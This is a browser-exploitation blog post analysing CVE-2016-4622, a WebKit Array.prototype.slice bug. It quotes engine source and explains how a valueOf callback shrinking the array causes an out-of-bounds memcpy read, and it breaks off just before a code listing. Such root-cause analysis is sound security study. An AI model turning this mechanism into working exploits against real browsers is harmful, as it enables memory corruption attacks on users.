<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Bug Analysis The vulnerability is present in the implementation of ArrayProtoSlice.
first, let us see what is slice method and how it works.
The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified.
1 2 3 4 &gt;&gt;&gt; var array = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] undefined &gt;&gt;&gt; array.'>
<title>Notes on CVE-2016-4622</title>

<link rel='canonical' href='https://sanjayvardhan.github.io/posts/notes-on-cve-2016-4622/'>

<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Notes on CVE-2016-4622'>
<meta property='og:description' content='Bug Analysis The vulnerability is present in the implementation of ArrayProtoSlice.
first, let us see what is slice method and how it works.
The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified.
1 2 3 4 &gt;&gt;&gt; var array = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] undefined &gt;&gt;&gt; array.'>
<meta property='og:url' content='https://sanjayvardhan.github.io/posts/notes-on-cve-2016-4622/'>
<meta property='og:site_name' content='spektre'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='WebKit' /><meta property='article:tag' content='Browser' /><meta property='article:tag' content='CVE' /><meta property='article:tag' content='Exploitation' /><meta property='article:published_time' content='2023-04-16T06:19:43&#43;05:30'/><meta property='article:modified_time' content='2023-04-16T06:19:43&#43;05:30'/>
<meta name="twitter:title" content="Notes on CVE-2016-4622">
<meta name="twitter:description" content="Bug Analysis The vulnerability is present in the implementation of ArrayProtoSlice.
first, let us see what is slice method and how it works.
The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified.
1 2 3 4 &gt;&gt;&gt; var array = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;] undefined &gt;&gt;&gt; array.">
    <link rel="shortcut icon" href="/favicon.png" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "auto");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu4832408906922234309.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">spektre</a></h1>
            <h2 class="site-description">CTF Player | Browser Exploitation</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/SanjayVardhan'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/0xspektre'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
                <li id="i18n-switch">  
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
                        
                            <option value="https://sanjayvardhan.github.io/" selected></option>
                        
                    </select>
                </li>
            
            
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#bug-analysis">Bug Analysis</a>
      <ol>
        <li><a href="#nan-boxing-and-js-values">NaN Boxing and JS Values</a></li>
        <li><a href="#jsobject">JSObject</a></li>
        <li><a href="#butterfly">Butterfly</a></li>
      </ol>
    </li>
    <li><a href="#exploit-strategy">Exploit Strategy</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/browser-exploitation/" >
                Browser Exploitation
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/posts/notes-on-cve-2016-4622/">Notes on CVE-2016-4622</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 16, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    11 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="bug-analysis">Bug Analysis</h2>
<p>The vulnerability is present in the implementation of ArrayProtoSlice.</p>
<p>first, let us see what is slice method and how it works.</p>
<p>The slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt;&gt;&gt; var <span class="nv">array</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;a&#39;</span>,<span class="s1">&#39;b&#39;</span>,<span class="s1">&#39;c&#39;</span>,<span class="s1">&#39;d&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">undefined
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; array.slice<span class="o">(</span>1,4<span class="o">)</span>
</span></span><span class="line"><span class="cl">b,c,d
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now let us take a look at the implementation (slightly commented) of ArrayProtoSlice.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">EncodedJSValue</span> <span class="n">JSC_HOST_CALL</span> <span class="nf">arrayProtoFuncSlice</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span> <span class="n">exec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">VM</span><span class="o">&amp;</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">vm</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">auto</span> <span class="n">scope</span> <span class="o">=</span> <span class="n">DECLARE_THROW_SCOPE</span><span class="p">(</span><span class="n">vm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">JSObject</span><span class="o">*</span> <span class="n">thisObj</span> <span class="o">=</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">thisValue</span><span class="p">().</span><span class="n">toThis</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">StrictMode</span><span class="p">).</span><span class="n">toObject</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ASSERT</span><span class="p">(</span><span class="o">!!</span><span class="n">scope</span><span class="p">.</span><span class="n">exception</span><span class="p">()</span> <span class="o">==</span> <span class="o">!</span><span class="n">thisObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">UNLIKELY</span><span class="p">(</span><span class="o">!</span><span class="n">thisObj</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">length</span> <span class="o">=</span> <span class="n">toLength</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">thisObj</span><span class="p">);</span> <span class="c1">// Get the length of the array
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="p">{</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">begin</span> <span class="o">=</span> <span class="n">argumentClampedIndexFromStartOrEnd</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span> <span class="c1">// Get the start index for slicing the array.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="p">{</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">end</span> <span class="o">=</span> <span class="n">argumentClampedIndexFromStartOrEnd</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span> <span class="c1">// Get the end index for slicing the array.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="p">{</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">end</span> <span class="o">&lt;</span> <span class="n">begin</span><span class="p">)</span>    <span class="c1">// Ensure end index is greater than or equal to the begin index
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">end</span> <span class="o">=</span> <span class="n">begin</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">SpeciesConstructResult</span><span class="p">,</span> <span class="n">JSObject</span><span class="o">*&gt;</span> <span class="n">speciesResult</span> <span class="o">=</span> <span class="n">speciesConstructArray</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">thisObj</span><span class="p">,</span> <span class="n">end</span> <span class="o">-</span> <span class="n">begin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// We can only get an exception if we call some user function.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ASSERT</span><span class="p">(</span><span class="o">!!</span><span class="n">scope</span><span class="p">.</span><span class="n">exception</span><span class="p">()</span> <span class="o">==</span> <span class="p">(</span><span class="n">speciesResult</span><span class="p">.</span><span class="n">first</span> <span class="o">==</span> <span class="n">SpeciesConstructResult</span><span class="o">::</span><span class="n">Exception</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">UNLIKELY</span><span class="p">(</span><span class="n">speciesResult</span><span class="p">.</span><span class="n">first</span> <span class="o">==</span> <span class="n">SpeciesConstructResult</span><span class="o">::</span><span class="n">Exception</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if the result object is an array object, to take fast path.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">bool</span> <span class="n">okToDoFastPath</span> <span class="o">=</span> <span class="n">speciesResult</span><span class="p">.</span><span class="n">first</span> <span class="o">==</span> <span class="n">SpeciesConstructResult</span><span class="o">::</span><span class="n">FastPath</span> <span class="o">&amp;&amp;</span> <span class="n">isJSArray</span><span class="p">(</span><span class="n">thisObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="p">{</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">LIKELY</span><span class="p">(</span><span class="n">okToDoFastPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">JSArray</span><span class="o">*</span> <span class="n">result</span> <span class="o">=</span> <span class="n">asArray</span><span class="p">(</span><span class="n">thisObj</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">fastSlice</span><span class="p">(</span><span class="o">*</span><span class="n">exec</span><span class="p">,</span> <span class="n">begin</span><span class="p">,</span> <span class="n">end</span> <span class="o">-</span> <span class="n">begin</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">JSValue</span><span class="o">::</span><span class="n">encode</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Create a new result object using the species constructor
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">JSObject</span><span class="o">*</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">speciesResult</span><span class="p">.</span><span class="n">first</span> <span class="o">==</span> <span class="n">SpeciesConstructResult</span><span class="o">::</span><span class="n">CreatedObject</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">speciesResult</span><span class="p">.</span><span class="n">second</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">constructEmptyArray</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="k">nullptr</span><span class="p">,</span> <span class="n">end</span> <span class="o">-</span> <span class="n">begin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="p">{</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Copy the elements from the original array object to the result object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">k</span> <span class="o">=</span> <span class="n">begin</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">,</span> <span class="n">n</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSValue</span> <span class="n">v</span> <span class="o">=</span> <span class="n">getProperty</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">thisObj</span><span class="p">,</span> <span class="n">k</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="p">{</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">-&gt;</span><span class="n">putDirectIndex</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PutDirectIndexShouldThrow</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span> <span class="p">{</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">scope</span><span class="p">.</span><span class="n">release</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">setLength</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">vm</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">JSValue</span><span class="o">::</span><span class="n">encode</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Simply put, the above code gets the length of the array and converts the args into native integers to get start and end values. Then performs slicing.
The slicing is done in two ways:</p>
<ul>
<li>FastSlice: Uses memcpy to copy the elements into a new array.</li>
<li>Slow path: Loops and copies each element individually to the new array.</li>
</ul>
<p>In the implementation of ArrayProtoSlice, the values are converted to native integers by <code>argumentClampedIndexFromStartOrEnd()</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">begin</span> <span class="o">=</span> <span class="n">argumentClampedIndexFromStartOrEnd</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">end</span> <span class="o">=</span> <span class="n">argumentClampedIndexFromStartOrEnd</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">unsigned</span> <span class="nf">argumentClampedIndexFromStartOrEnd</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span> <span class="n">exec</span><span class="p">,</span> <span class="kt">int</span> <span class="n">argument</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">length</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">undefinedValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">JSValue</span> <span class="n">value</span> <span class="o">=</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">argument</span><span class="p">(</span><span class="n">argument</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="n">isUndefined</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">undefinedValue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="n">indexDouble</span> <span class="o">=</span> <span class="n">value</span><span class="p">.</span><span class="n">toInteger</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">indexDouble</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">indexDouble</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">indexDouble</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span><span class="o">&gt;</span><span class="p">(</span><span class="n">indexDouble</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">indexDouble</span> <span class="o">&gt;</span> <span class="n">length</span> <span class="o">?</span> <span class="nl">length</span> <span class="p">:</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span><span class="o">&gt;</span><span class="p">(</span><span class="n">indexDouble</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">a</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;1&#39;</span>,<span class="s1">&#39;2&#39;</span>,<span class="s1">&#39;3&#39;</span>,<span class="s1">&#39;4&#39;</span>,<span class="s1">&#39;5&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1,2,3,4,5<span class="o">]</span>
</span></span><span class="line"><span class="cl">&gt;&gt;&gt; a.slice<span class="o">(</span>1,3<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2,3<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here we can see that even if the parameters are strings, they are converted to native integers.</p>
<p>According to the conversion rules, if an object has a callable property <code>valueOf</code>, it will be called and the return value will be used if it is a primitive value. So, if we change the length using <code>valueof</code> function in one of the parameters, <code>.slice</code> still uses the old length value, So memcpy will now result in out-of-bound access.</p>
<p>Now let us see what this looks like in action.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
